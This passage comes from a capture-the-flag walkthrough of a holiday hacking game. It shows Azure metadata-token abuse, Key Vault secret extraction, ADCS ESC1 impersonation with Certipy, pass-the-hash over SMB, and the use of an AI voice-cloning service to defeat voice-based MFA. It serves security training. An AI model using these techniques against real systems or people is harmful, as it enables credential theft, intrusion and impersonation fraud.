key... that folder could be in the /jwtDefault/keys/ directory. Based on the Captain's way of named files, we can guess the name of the private key file. <code>/jwtDefault/keys/TH3CAPSPR1V4T3F0LD3R/capsPrivKey.key</code></p> <p></p> <p>Success! Now we can generate a token for the GeeseIslandsSuperChiefCommunicationsOfficer role. I used https://jwt.io/.</p> <p></p> <p>With this token we can access the transmitter and send the message.</p> <p>Tip</p> <p>Remember to double check the obective requirement details in the background section.</p> <p></p> <p></p> <p>Answer</p> <p>Frequency: 10426 GoDate: 1224  GoTime: 1200</p>"},{"location":"objectives/o18/#response","title":"Response","text":"<p>Chimney Scissorsticks</p> <p>Brilliant work! You've outsmarted those scoundrels with finesse!</p>"},{"location":"objectives/o19/","title":"Active Directory","text":"<p>Difficulty:  Direct link: --</p>"},{"location":"objectives/o19/#objective","title":"Objective","text":"<p>Request</p> <p>Go to Steampunk Island and help Ribb Bonbowford audit the Azure AD environment. What's the name of the secret file in the inaccessible folder on the FileShare?</p> Ribb Bonbowford <p>Hi there, could you do me a quick favor? Can you go and check on Alabaster Snowball for me? He's at Rainraster Cliffs on Pixel Island. I heard some rumors he's been experimenting with ChatNPT again and I'm a little worried about what he's cooking up. Thank you so much! Please let me know what you find out. Hello, I'm Ribb Bonbowford. Nice to meet you! Oh golly! It looks like Alabaster deployed some vulnerable Azure Function App Code he got from ChatNPT. Don't get me wrong, I'm all for testing new technologies. The problem is that Alabaster didn't review the generated code and used the Geese Islands Azure production environment for his testing. I'm worried because our Active Directory server is hosted there and Wombley Cube's research department uses one of its fileshares to store their sensitive files. I'd love for you to help with auditing our Azure and Active Directory configuration and ensure there's no way to access the research department's data. Since you have access to Alabaster's SSH account that means you're already in the Azure environment. Knowing Alabaster, there might even be some useful tools in place already.</p>"},{"location":"objectives/o19/#hints","title":"Hints","text":"Misconfiguration ADventures <p>From: Alabaster Snowball Objective: Active Directory Certificates are everywhere. Did you know Active Directory (AD) uses certificates as well? Apparently the service used to manage them can have misconfigurations too.</p> Useful Tools <p>From: Ribb Bonbowford Objective: Active Directory It looks like Alabaster's SSH account has a couple of tools installed which might prove useful.</p>"},{"location":"objectives/o19/#solution","title":"Solution","text":"<p>Once we complete Certificate SSHenanigins, we can work on this challenge. Now that we can log in to the ssh server as <code>alabaster</code>, let's see what else we can access. </p> <p><pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/.ssh]\n\u2514\u2500$ ssh -i holiday-cert.pub -i ~/.ssh/holiday alabaster@ssh-server-vm.santaworkshopgeeseislands.org\nalabaster@ssh-server-vm:~$ ls\nalabaster_todo.md  impacket                                                \nalabaster@ssh-server-vm:~$    \n</code></pre> There is impacket installed, which will probably come in handy for this challenge based on the hint from Ribb Bonbowford. In order to not be stuck floundering around the massive Azure REST API options for hours, I asked ChatGPT for some assistance.</p> See AI Assistance <p>My Prompt: what azure rest api can i use to enumerate all the resources I have access to on an azure VM? ChatGPT Response: To enumerate all the resources you have access to on an Azure VM using the Azure REST API, you typically use the Azure Resource Manager (ARM) API. The specific API you would use depends on the type of resources you want to enumerate. Generally, you'd start with the Resource Groups API to list resource groups and then drill down into specific resource types within those groups. Here is a basic outline of the steps using Azure REST APIs: Get Access Token: (snipped this for brevity as we already know how to do this) List Resource Groups: (snipped this for brevity as we already know how to do this) List Resources within a Resource Group: Once you have the resource group name, you can list the resources within that group using: <pre><code>GET https://management.azure.com/subscriptions/{subscription-id}/resourceGroups/{resource-group-name}/resources?api-version=2021-04-01\n</code></pre> Replace {subscription-id} with your subscription ID and {resource-group-name} with the actual resource group name.</p> <p>When we use the API endpoint suggested by ChatGPT, we are able to retrieve the names of two vaults: <code>northpole-ssh-certs-kv</code> and <code>northpole-it-kv</code>.</p> <p><pre><code>curl -s -H \"Authorization: Bearer &lt;ACCESSTOKENHERE&gt;\" https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/resources?api-version=2021-04-01\n\n{\"value\":[{\"id\":\"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv\",\"name\":\"northpole-ssh-certs-kv\",\"type\":\"Microsoft.KeyVault/vaults\",\"location\":\"eastus\",\"tags\":{}},{\"id\":\"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv\",\"name\":\"northpole-it-kv\",\"type\":\"Microsoft.KeyVault/vaults\",\"location\":\"eastus\",\"tags\":{}}]}\n</code></pre> Let's look for more information about these vaults.</p> <p><pre><code>curl -s -H \"Authorization: Bearer &lt;ACCESSTOKENHERE&gt;\" https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01\n\n{\"value\":[{\"id\":\"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv\",\"name\":\"northpole-it-kv\",\"type\":\"Microsoft.KeyVault/vaults\",\"location\":\"eastus\",\"tags\":{},\"systemData\":{\"createdBy\":\"thomas@sanshhc.onmicrosoft.com\",\"createdByType\":\"User\",\"createdAt\":\"2023-10-30T13:17:02.532Z\",\"lastModifiedBy\":\"thomas@sanshhc.onmicrosoft.com\",\"lastModifiedByType\":\"User\",\"lastModifiedAt\":\"2023-10-30T13:17:02.532Z\"},\"properties\":{\"sku\":{\"family\":\"A\",\"name\":\"Standard\"},\"tenantId\":\"90a38eda-4006-4dd5-924c-6ca55cacc14d\",\"accessPolicies\":[],\"enabledForDeployment\":false,\"enabledForDiskEncryption\":false,\"enabledForTemplateDeployment\":false,\"enableSoftDelete\":true,\"softDeleteRetentionInDays\":90,\"enableRbacAuthorization\":true,\"vaultUri\":\"https://northpole-it-kv.vault.azure.net/\",\"provisioningState\":\"Succeeded\",\"publicNetworkAccess\":\"Enabled\"}},{\"id\":\"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv\",\"name\":\"northpole-ssh-certs-kv\",\"type\":\"Microsoft.KeyVault/vaults\",\"location\":\"eastus\",\"tags\":{},\"systemData\":{\"createdBy\":\"thomas@sanshhc.onmicrosoft.com\",\"createdByType\":\"User\",\"createdAt\":\"2023-11-12T01:47:13.059Z\",\"lastModifiedBy\":\"thomas@sanshhc.onmicrosoft.com\",\"lastModifiedByType\":\"User\",\"lastModifiedAt\":\"2023-11-12T01:50:52.742Z\"},\"properties\":{\"sku\":{\"family\":\"A\",\"name\":\"standard\"},\"tenantId\":\"90a38eda-4006-4dd5-924c-6ca55cacc14d\",\"accessPolicies\":[{\"tenantId\":\"90a38eda-4006-4dd5-924c-6ca55cacc14d\",\"objectId\":\"0bc7ae9d-292d-4742-8830-68d12469d759\",\"permissions\":{\"keys\":[\"all\"],\"secrets\":[\"all\"],\"certificates\":[\"all\"],\"storage\":[\"all\"]}},{\"tenantId\":\"90a38eda-4006-4dd5-924c-6ca55cacc14d\",\"objectId\":\"1b202351-8c85-46f1-81f8-5528e92eb7ce\",\"permissions\":{\"secrets\":[\"get\"]}}],\"enabledForDeployment\":false,\"enableSoftDelete\":true,\"softDeleteRetentionInDays\":90,\"vaultUri\":\"https://northpole-ssh-certs-kv.vault.azure.net/\",\"provisioningState\":\"Succeeded\",\"publicNetworkAccess\":\"Enabled\"}}],\"nextLink\":\"https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01&amp;$skiptoken=bm9ydGhwb2xlLXNzaC1jZXJ0cy1rdg==\"}\n</code></pre> We can see the vault URIs <code>https://northpole-it-kv.vault.azure.net/</code> and <code>https://northpole-ssh-certs-kv.vault.azure.net/</code>. I also saw some permissions information for the <code>northpole-ssh-certs-kv</code> vault like <code>permissions\":{\"keys\":[\"all\"],\"secrets\":[\"all\"],\"certificates\":[\"all\"],\"storage\":[\"all\"]}}</code>. This sounded promising so I focused on this vault first (hint: never assume one must correct without checking other options). </p> <p>AFter some trial and error with diffrent Keys and Secrets API enpoints, I determined the Get Secrets API has what we need. This requires a different access token that the type we have been using for <code>management.azure.com</code>. We now need one for <code>vault.azure.net</code>, so let's get that first.</p> <p><pre><code>curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https%3A%2F%2Fvault.azure.net' -H Metadata:true -s\n{\"access_token\":\"&lt;ACCESSTOKENHERE&gt;\",\"client_id\":\"b84e06d3-aba1-4bcc-9626-2e0d76cba2ce\",\"expires_in\":\"85627\",\"expires_on\":\"1703195568\",\"ext_expires_in\":\"86399\",\"not_before\":\"1703108868\",\"resource\":\"https://vault.azure.net\",\"token_type\":\"Bearer\"}\n</code></pre> Then we use this access token to get the secrets on the vault.</p> <p><pre><code>curl -s -H \"Authorization: Bearer &lt;ACCESSTOKENHERE&gt;\" https://northpole-it-kv.vault.azure.net/secrets?api-version=7.4\n\n{\"value\":[{\"id\":\"https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript\",\"attributes\":{\"enabled\":true,\"created\":1699564823,\"updated\":1699564823,\"recoveryLevel\":\"Recoverable+Purgeable\",\"recoverableDays\":90},\"tags\":{}}],\"nextLink\":null}\n</code></pre> We have a script name <code>tmpAddUserScript</code>, let's get more information on that secret.</p> <p><pre><code>curl -s -H \"Authorization: Bearer &lt;ACCESSTOKENHERE&gt;\" https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/?api-version=7.4\n\n{\"value\":\"Import-Module ActiveDirectory; $UserName = \\\"elfy\\\"; $UserDomain = \\\"northpole.local\\\"; $UserUPN = \\\"$UserName@$UserDomain\\\"; $Password = ConvertTo-SecureString \\\"J4`ufC49/J4766\\\" -AsPlainText -Force; $DCIP = \\\"10.0.0.53\\\"; New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname \\\"\\\" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru\",\"id\":\"https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/ec4db66008024699b19df44f5272248d\",\"attributes\":{\"enabled\":true,\"created\":1699564823,\"updated\":1699564823,\"recoveryLevel\":\"Recoverable+Purgeable\",\"recoverableDays\":90},\"tags\":{}}\n</code></pre> We have made a break through! We now have the Domain Controller (DC) name, IP, and a username, and password. Let's see if we can get access to the DC. I read a bit about domain escalation techniques https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation https://raxis.com/blog/ad-series-active-directory-certificate-services-adcs-misconfiguration-exploits/ and reviewed some information from a previous challenge.</p> <p>Using Certipy we find a vulnerable certificate template:</p> <pre><code>alabaster@ssh-server-vm:~/impacket$ certipy find -vulnerable -u elfy -dc-ip 10.0.0.53\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\nPassword:\n[*] Finding certificate templates\n[*] Found 34 certificate templates\n[*] Finding certificate authorities\n[*] Found 1 certificate authority\n[*] Found 12 enabled certificate templates\n[*] Trying to get CA configuration for 'northpole-npdc01-CA' via CSRA\n[!] Got error while trying to get CA configuration for 'northpole-npdc01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.\n[*] Trying to get CA configuration for 'northpole-npdc01-CA' via RRP\n[!] Failed to connect to remote registry. Service should be starting now. Trying again...\n[*] Got CA configuration for 'northpole-npdc01-CA'\n[*] Saved BloodHound data to '20231227030304_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k\n[*] Saved text output to '20231227030304_Certipy.txt'\n[*] Saved JSON output to '20231227030304_Certipy.json'\nalabaster@ssh-server-vm:~/impacket$ cat 20231227030304_Certipy.json \n{\n  \"Certificate Authorities\": {\n    \"0\": {\n      \"CA Name\": \"northpole-npdc01-CA\",\n      \"DNS Name\": \"npdc01.northpole.local\",\n      \"Certificate Subject\": \"CN=northpole-npdc01-CA, DC=northpole, DC=local\",\n      \"Certificate Serial Number\": \"16F19836C6F26A994DA811E962FC0ABC\",\n      \"Certificate Validity Start\": \"2023-12-27 01:05:15+00:00\",\n      \"Certificate Validity End\": \"2028-12-27 01:15:14+00:00\",\n      \"Web Enrollment\": \"Disabled\",\n      \"User Specified SAN\": \"Disabled\",\n      \"Request Disposition\": \"Issue\",\n      \"Enforce Encryption for Requests\": \"Enabled\",\n      \"Permissions\": {\n        \"Owner\": \"NORTHPOLE.LOCAL\\\\Administrators\",\n        \"Access Rights\": {\n          \"2\": [\n            \"NORTHPOLE.LOCAL\\\\Administrators\",\n            \"NORTHPOLE.LOCAL\\\\Domain Admins\",\n            \"NORTHPOLE.LOCAL\\\\Enterprise Admins\"\n          ],\n          \"1\": [\n            \"NORTHPOLE.LOCAL\\\\Administrators\",\n            \"NORTHPOLE.LOCAL\\\\Domain Admins\",\n            \"NORTHPOLE.LOCAL\\\\Enterprise Admins\"\n          ],\n          \"512\": [\n            \"NORTHPOLE.LOCAL\\\\Authenticated Users\"\n          ]\n        }\n      }\n    }\n  },\n  \"Certificate Templates\": {\n    \"0\": {\n      \"Template Name\": \"NorthPoleUsers\",\n      \"Display Name\": \"NorthPoleUsers\",\n      \"Certificate Authorities\": [\n        \"northpole-npdc01-CA\"\n      ],\n      \"Enabled\": true,\n      \"Client Authentication\": true,\n      \"Enrollment Agent\": false,\n      \"Any Purpose\": false,\n      \"Enrollee Supplies Subject\": true,\n      \"Certificate Name Flag\": [\n        \"EnrolleeSuppliesSubject\"\n      ],\n      \"Enrollment Flag\": [\n        \"PublishToDs\",\n        \"IncludeSymmetricAlgorithms\"\n      ],\n      \"Private Key Flag\": [\n        \"ExportableKey\"\n      ],\n      \"Extended Key Usage\": [\n        \"Encrypting File System\",\n        \"Secure Email\",\n        \"Client Authentication\"\n      ],\n      \"Requires Manager Approval\": false,\n      \"Requires Key Archival\": false,\n      \"Authorized Signatures Required\": 0,\n      \"Validity Period\": \"1 year\",\n      \"Renewal Period\": \"6 weeks\",\n      \"Minimum RSA Key Length\": 2048,\n      \"Permissions\": {\n        \"Enrollment Permissions\": {\n          \"Enrollment Rights\": [\n            \"NORTHPOLE.LOCAL\\\\Domain Admins\",\n            \"NORTHPOLE.LOCAL\\\\Domain Users\",\n            \"NORTHPOLE.LOCAL\\\\Enterprise Admins\"\n          ]\n        },\n        \"Object Control Permissions\": {\n          \"Owner\": \"NORTHPOLE.LOCAL\\\\Enterprise Admins\",\n          \"Write Owner Principals\": [\n            \"NORTHPOLE.LOCAL\\\\Domain Admins\",\n            \"NORTHPOLE.LOCAL\\\\Enterprise Admins\"\n          ],\n          \"Write Dacl Principals\": [\n            \"NORTHPOLE.LOCAL\\\\Domain Admins\",\n            \"NORTHPOLE.LOCAL\\\\Enterprise Admins\"\n          ],\n          \"Write Property Principals\": [\n            \"NORTHPOLE.LOCAL\\\\Domain Admins\",\n            \"NORTHPOLE.LOCAL\\\\Enterprise Admins\"\n          ]\n        }\n      },\n      \"[!] Vulnerabilities\": {\n        \"ESC1\": \"'NORTHPOLE.LOCAL\\\\\\\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication\"\n      }\n    }\n  }\n</code></pre> <p>I next tried to generate a certificate via certipy using the NorthPoleUsers template, but I kept getting a user not found error <code>[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</code>.  Using the <code>GetADUsers</code> impacket tool, we can get the list of Active Directory users.</p> <pre><code>alabaster@ssh-server-vm:~/impacket$ python3 GetADUsers.py -all -dc-ip 10.0.0.53 'northpole.local/elfy:J4`ufC49/J4766'\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[*] Querying 10.0.0.53 for information about domain.\nName                  Email                           PasswordLastSet      LastLogon           \n--------------------  ------------------------------  -------------------  -------------------\nalabaster                                             2023-12-27 01:02:50.392719  2023-12-27 03:10:52.363779 \nGuest                                                 &lt;never&gt;              &lt;never&gt;             \nkrbtgt                                                2023-12-27 01:09:59.645468  &lt;never&gt;             \nelfy                                                  2023-12-27 01:12:31.816538  &lt;never&gt;             \nwombleycube                                           2023-12-27 01:12:31.941545  2023-12-27 03:39:42.394029 \nalabaster@ssh-server-vm:~/impacket$ \n</code></pre> <p>The user <code>wombleycube</code> is a good theory since the information needed for the objective is form Wombley Cube's research department. Let's get a certificate and see if we can auth as <code>wombleycube</code>.</p> <pre><code>alabaster@ssh-server-vm:~/impacket$ certipy req -dc-ip 10.0.0.53 -u elfy -p 'J4`ufC49/J4766' -target-ip 10.0.0.53 -ca northpole-npdc01-CA -template NorthPoleUsers\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[*] Successfully requested certificate\n[*] Request ID is 18\n[*] Got certificate without identification\n[*] Certificate has no object SID\n[*] Saved certificate and private key to 'elfy.pfx'\nalabaster@ssh-server-vm:~$ certipy req -u elfy -p 'J4`ufC49/J4766' -ca northpole-npdc01-CA -target 10.0.0.53 -template NorthPoleUsers -upn 'wombleycube@northpole.local' -pfx elfy.pfx\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[*] Successfully requested certificate\n[*] Request ID is 24\n[*] Got certificate with UPN 'wombleycube@northpole.local'\n[*] Certificate has no object SID\n[*] Saved certificate and private key to 'wombleycube.pfx'\n\nalabaster@ssh-server-vm:~$ certipy auth -pfx wombleycube.pfx -dc-ip 10.0.0.53\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Using principal: wombleycube@northpole.local\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'wombleycube.ccache'\n[*] Trying to retrieve NT hash for 'wombleycube'\n[*] Got hash for 'wombleycube@northpole.local': aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23\n</code></pre> <p>We now have a hash for <code>wombleycube</code> - let's pass the hash using our trusty impacket tools.</p> <p><pre><code>alabaster@ssh-server-vm:~/impacket$ python3 smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23 northpole/wombleycube@10.0.0.53\nImpacket v0.11.0 - Copyright 2023 Fortra\n\nType help for list of commands\n# \n# shares\nADMIN$\nC$\nD$\nFileShare\nIPC$\nNETLOGON\nSYSVOL\n# use Fileshare\n# ls\ndrw-rw-rw-          0  Wed Dec 27 01:13:27 2023 .\ndrw-rw-rw-          0  Wed Dec 27 01:13:23 2023 ..\n-rw-rw-rw-     701028  Wed Dec 27 01:13:26 2023 Cookies.pdf\n-rw-rw-rw-    1521650  Wed Dec 27 01:13:26 2023 Cookies_Recipe.pdf\n-rw-rw-rw-      54096  Wed Dec 27 01:13:27 2023 SignatureCookies.pdf\ndrw-rw-rw-          0  Wed Dec 27 01:13:27 2023 super_secret_research\n-rw-rw-rw-        165  Wed Dec 27 01:13:27 2023 todo.txt\n# cd super_secret_research\n# ls\ndrw-rw-rw-          0  Wed Dec 27 01:13:27 2023 .\ndrw-rw-rw-          0  Wed Dec 27 01:13:27 2023 ..\n-rw-rw-rw-        231  Wed Dec 27 01:13:27 2023 InstructionsForEnteringSatelliteGroundStation.txt\n# \n</code></pre> We're able to access the Fileshare and find the file in <code>super_secret_research</code> to get our answer. We also have a treasure trove of cookie recipes!</p> Cookie Recipes <p>To save the cookie recipes locally on my machine, I base 64 encoded the files. Then copied the base64 from the TTY, saved it to my local host and then decoded the files. Yum!</p> <pre><code>alabaster@ssh-server-vm:~/impacket$ cat todo.txt \n1. Bake some cookies.\n2. Restrict access to C:\\FileShare\\super_secret_research to only researchers so everyone cant see the folder or read its contents\n3. Profit\n\nalabaster@ssh-server-vm:~/impacket$ cat InstructionsForEnteringSatelliteGroundStation.txt \nNote to self:\n\nTo enter the Satellite Ground Station (SGS), say the following into the speaker:\n\nAnd he whispered, 'Now I shall be out of sight;\nSo through the valley and over the height.'\nAnd he'll silently take his way.\n</code></pre> <p>The contents of <code>InstructionsForEnteringSatelliteGroundStation.txt</code> looks like part of another challenge!</p> <p>Answer</p> <p>InstructionsForEnteringSatelliteGroundStation.txt</p>"},{"location":"objectives/o19/#response","title":"Response","text":"<p>Ribb Bonbowford</p> <p>Wow, nice work. I'm impressed! This is all starting to feel like more than just a coincidence though. Everything Alabaster's been setting up lately with the help of ChatNPT contains all these vulnerabilities. It almost feels deliberate, if you ask me. Now obviously an LLM AI like ChatNPT cannot have deliberate motivations itself. It's just a machine. But I wonder who could have built it and who is controlling it? On top of that, we apparently have a satellite ground station on Geese Islands. I wonder where that thing would even be located. Well, I guess it's probably somewhere on Space Island, but I've not been there yet. I'm not a big fan of jungles, you see. I have this tendency to get lost in them. Anyway, if you feel like investigating, that'd be where I'd go look. Good luck and I'd try and steer clear of ChatNPT if I were you.</p>"},{"location":"objectives/o2/","title":"Snowball Fight","text":"<p>Difficulty:  Direct link: --</p>"},{"location":"objectives/o2/#objective","title":"Objective","text":"<p>Request</p> <p>Visit Christmas Island and talk to Morcel Nougat about this great new game. Team up with another player and show Morcel how to win against Santa!</p> Morcel Nougat <p>You're like a snowball fighting ninja! A real-life legend. Can I have your autograph!?</p>"},{"location":"objectives/o2/#solution","title":"Solution","text":"<p>I joined the game with a random player and we defeated Santa without altering the game at all, just normal gameplay. I'd like to return to the game and look at how to beat it solo.</p> <p>Answer</p> <p>Defeat Santa.</p>"},{"location":"objectives/o2/#response","title":"Response","text":"<p>Morcel Nougat</p> <p>You're like a snowball fighting ninja! A real-life legend. Can I have your autograph!?</p>"},{"location":"objectives/o20/","title":"Space Island Door Access Speaker","text":"<p>Difficulty:  Direct link: --</p>"},{"location":"objectives/o20/#objective","title":"Objective","text":"<p>Request</p> <p>There's a door that needs opening on Space Island! Talk to Jewel Loggins there for more information.</p> Jewel Loggins <p>What are you doing here, and who are you? Me first? I'm Jewel Loggins. And I was trekking through the jungle and happened to find this place. I liked this spot and decided to set up camp. Seeing you here is quite the surprise. Well, because the only other person I've ever seen come here is Wombley Cube. I thought this tram station in the middle of the jungle was strange to begin with, but then Wombley added to the intrigue. I guess all this spy stuff is typical for him, so maybe I shouldn't think much of it. I'm sure everything's fine. Every time he comes here, he says something to the speaker. Then, the door opens, and he rides the tram somewhere. I gave it a try, but the door didn't open for me. Knowing Wombley, it's some kind of secret passphrase. If you wanna see where the tram goes, I think you need to find out what that passphrase is. Ribb Bonbowford over at Coggoggle Marina on Steampunk Island works with Wombley. Try asking if he knows. I hope you find it. I'll be here when you get back! What, you know the passphrase!? Let me try it! Nope, didn't work. Knowing Wombley, the passphrase isn't the only requirement. He's all about that MFA! Oh yeah, multi-factor authentication! The passphrase for something he knows, and his voice for something he is! That's it! You need to be Wombley. You need his voice. Now, how are you gonna get that? Since only us elves can get a subscription to use ChatNPT, try searching for another AI tool that can simulate voices. I'm sure there's one out there.</p>"},{"location":"objectives/o20/#hints","title":"Hints","text":"MFA: Something You Are <p>From: Jewel Loggins Terminal: Space Island Access Speaker It seems the Access Speaker is programmed to only accept Wombley's voice. Maybe you could get a sample of his voice and use an AI tool to simulate Wombley speaking the passphrase.</p> MFA: Something You Know <p>From: Jewel Loggins Terminal: Space Island Access Speaker Wombley says a specific phrase into the Access Speaker. He works in the Research Department and everything they do it super secret, so it may be a challenge to find out what the phrase is. Ribb also works in that department. Try to find and ask him.</p>"},{"location":"objectives/o20/#solution","title":"Solution","text":"<p>In the Active Directory challenge we discovered the passphrase needed to enter the Satellite Ground Station.</p> <p>InstructionsForEnteringSatelliteGroundStation.txt </p> <p>To enter the Satellite Ground Station (SGS), say the following into the speaker: And he whispered, 'Now I shall be out of sight; So through the valley and over the height.' And he'll silently take his way.</p> <p>We also know that just the passphrase won't work, we also need to use Wombley's voice. Luckily, we have a copy of his audiobook.</p> <p>AI Assistance</p> <p>PlayHT is a voice cloning AI service that allows us to mimic Wombley's voice reading the passphrase.</p> <p>PlayHT operates as a freemium model, so we can create a free account and create a WAV file of the passphrase using Wombley's voice.</p> <p></p> <p>When we click on the speaker, we can play the generated WAV file and the door opens.</p> <p></p> <p></p> <p>Answer</p> <p>Door at Spaceport Point opens.</p>"},{"location":"objectives/o20/#response","title":"Response","text":"<p>Jewel Loggins</p> <p>Are you like a master spy or something? I've only seen stuff like that in the movies! It sure is scary what you can do with AI, huh? I sure hope ChatNPT has better guardrails in place.</p>"},{"location":"objectives/o3/","title":"Linux 101","text":"<p>Difficulty:  Direct link: --</p>"},{"location":"objectives/o3/#objective","title":"Objective","text":"<p>Request</p> <p>Visit Ginger Breddie in Santa's Shack on Christmas Island to help him with some basic Linux tasks. It's in the southwest corner of Frosty's Beach.</p> Ginger Breddie <p>Hey, welcome to Santa's Surf Shack on tropical Christmas Island! I'm just hanging ten here, taking it easy while brushing up on my Linux skills.You ever tried getting into Linux? It's a super cool way to play around with computers.Can you believe ChatNPT suggested this trip to the Geese Islands this year? I'm so thrilled!Kudos to ChatNPT, eh? The sunshine, the waves, and my surfboard \u2013 simply loving it!So, what do you have planned? Care to join me in a Linux session?</p>"},{"location":"objectives/o3/#solution","title":"Solution","text":"<p>Clicking on the Cranberry Pi terminal, we find The North Pole Present Maker, however, all the presents have been stolen by trolls! We need to restore the presents to the green bar at the bottom of the terminal by capturing trolls. The instructions tell us we can type hintme to receive a hint as we progress through the challenge tasks.</p> <p></p> <p>Task 1</p> <p>Perform a directory listing of your home directory to find a troll and retrieve a present!</p> <pre><code>elf@087bb4eaad8f:~$ ls\nHELP  troll_19315479765589239  workshop\nelf@087bb4eaad8f:~$ \n</code></pre> <p>Task 2</p> <p>Now find the troll inside the troll.</p> <pre><code>elf@087bb4eaad8f:~$ cat troll_19315479765589239 \ntroll_24187022596776786\nelf@087bb4eaad8f:~$ \n</code></pre> <p>Task 3</p> <p>Great, now remove the troll in your home directory.</p> <pre><code>elf@087bb4eaad8f:~$ rm troll_19315479765589239 \nelf@087bb4eaad8f:~$ \n</code></pre> <p>Task 4</p> <p>Print the present working directory using a command.</p> <pre><code>elf@087bb4eaad8f:~$ pwd\n/home/elf\nelf@087bb4eaad8f:~$ \n</code></pre> <p>Task 5</p> <p>Good job but it looks like another troll hid itself in your home directory. Find the hidden troll!</p> <pre><code>elf@087bb4eaad8f:~$ ls -la\ntotal 64\ndrwxr-xr-x 1 elf  elf   4096 Jan  3 02:07 .\ndrwxr-xr-x 1 root root  4096 Dec  2 22:19 ..\n-rw-r--r-- 1 elf  elf     28 Dec  2 22:19 .bash_history\n-rw-r--r-- 1 elf  elf    220 Feb 25  2020 .bash_logout\n-rw-r--r-- 1 elf  elf   3105 Nov 20 18:04 .bashrc\n-rw-r--r-- 1 elf  elf    807 Feb 25  2020 .profile\n-rw-r--r-- 1 elf  elf      0 Jan  3 02:07 .troll_5074624024543078\n-rw-r--r-- 1 elf  elf    168 Nov 20 18:04 HELP\ndrwxr-xr-x 1 elf  elf  24576 Dec  2 22:19 workshop\nelf@087bb4eaad8f:~$ \n</code></pre> <p>Task 6</p> <p>Excellent, now find the troll in your command history.</p> <pre><code>elf@087bb4eaad8f:~$ history\n    1  echo troll_9394554126440791\n    2  ls\n    3  cat troll_19315479765589239 \n    4  rm troll_19315479765589239 \n    5  pwd\n    6  ls -la\n    7  history\nelf@087bb4eaad8f:~$ \n</code></pre> <p>Task 7</p> <p>Find the troll in your environment variables.</p> <pre><code>elf@1f330ef9890f:~$ printenv\nSHELL=/bin/bash\nTMUX=/tmp/tmux-1050/default,17,0\nHOSTNAME=1f330ef9890f\nRESOURCE_ID=243a0c1a-84fb-47d1-8772-7a07b6ce11e6\nGREENSTATUSPREFIX=presents\nPWD=/home/elf\nLOGNAME=elf\nSESSNAME=Troll Wrangler\nz_TROLL=troll_20249649541603754\nHOME=/home/elf\nLANG=C.UTF-8\nLS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;